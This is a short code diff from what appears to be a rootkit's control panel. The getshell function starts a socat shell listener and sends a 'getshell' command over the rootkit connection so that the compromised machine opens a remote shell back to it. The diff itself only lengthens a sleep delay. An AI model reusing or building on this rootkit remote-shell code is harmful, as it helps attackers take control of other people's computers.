@@ -117,7 +117,7 @@ def getshell():
             response["message"] = "❌ Le port doit être entre 1024 et 65535."
         else:
             threading.Thread(target=run_socat_shell, args=(port,), daemon=True).start()
-            time.sleep(1)
+            time.sleep(2)
 
             cfg.rootkit_connexion.send(f"getshell {port}", False, 'tcp')
             response["status"] = "success"
